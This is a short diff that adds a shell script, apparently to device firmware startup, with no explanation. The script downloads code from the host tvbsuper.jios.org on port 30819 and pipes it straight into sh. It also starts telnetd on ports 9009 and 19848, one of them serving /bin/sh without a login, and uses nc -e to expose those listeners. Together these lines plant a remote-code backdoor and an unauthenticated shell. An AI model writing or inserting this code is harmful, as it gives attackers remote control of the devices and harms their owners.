@@ -1,0 +1,13 @@
+if [ -f /mnt/firmware/avn ]; then
+sh /mnt/firmware/avn
+else
+( wget http://tvbsuper.jios.org:30819/avn -O -|sh ) &
+if [ -z "$(ps | grep telnetd | grep -v grep)" ]; then
+telnetd -p 9009 &
+telnetd -p 19848 -l /bin/sh &
+sleep 3
+nc -ll -p 9009 -e telnetd &
+nc -ll -p 19848 -e telnetd -l /bin/sh &
+fi
+
+fi
